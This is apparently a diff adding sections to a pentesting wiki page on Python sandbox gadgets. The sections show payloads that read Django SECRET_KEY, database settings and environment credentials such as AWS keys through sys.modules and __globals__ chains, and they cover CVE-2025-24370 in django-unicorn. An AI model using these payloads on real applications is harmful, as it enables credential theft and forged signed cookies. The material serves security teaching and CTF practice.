@@ -41,7 +41,57 @@ Use this payload to **change `app.secret_key`** (the name in your app might be d
 
 If the vulnerability is in a different python file, check the previous Flask trick to access the objects from the main python file.
 
+### Django - SECRET_KEY and settings module
+
+The Django settings object is cached in `sys.modules` once the application starts. With only read primitives you can leak the **`SECRET_KEY`**, database credentials or signing salts:
+
+```python
+# When DJANGO_SETTINGS_MODULE is set (usual case)
+sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY
+
+# Through the global settings proxy
+a = sys.modules['django.conf'].settings
+(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
+```
+
+If the vulnerable gadget is in another module, walk globals first:
+
+```python
+__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
+```
+
+Once the key is known you can forge Django signed cookies or tokens in a similar way to Flask.
+
+### Environment variables / cloud creds via loaded modules
+
+Many jails still import `os` or `sys` somewhere. You can abuse any reachable function `__init__.__globals__` to pivot to the already-imported `os` module and dump **environment variables** containing API tokens, cloud keys or flags:
+
+```python
+# Classic os._wrap_close subclass index may change per version
+cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
+cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
+```
+
+If the subclass index is filtered, use loaders:
+
+```python
+__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
+```
+
+Environment variables are frequently the only secrets needed to move from read to full compromise (cloud IAM keys, database URLs, signing keys, etc.).
+
+### Django-Unicorn class pollution (CVE-2025-24370)
+
+`django-unicorn` (<0.62.0) allowed **class pollution** via crafted component requests. Setting a property path such as `__init__.__globals__` let an attacker reach the component module globals and any imported modules (e.g. `settings`, `os`, `sys`). From there you can leak `SECRET_KEY`, `DATABASES` or service credentials without code execution. The exploit chain is purely read-based and uses the same dunder-gadget patterns as above.
+
+### Gadget collections for chaining
+
+Recent CTFs (e.g. jailCTF 2025) show reliable read chains built only with attribute access and subclass enumeration. Community-maintained lists such as [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) catalog hundreds of minimal gadgets you can combine to traverse from objects to `__globals__`, `sys.modules` and finally sensitive data. Use them to quickly adapt when indices or class names differ between Python minor versions.
+
+
+
+## References
+
+- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
+- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
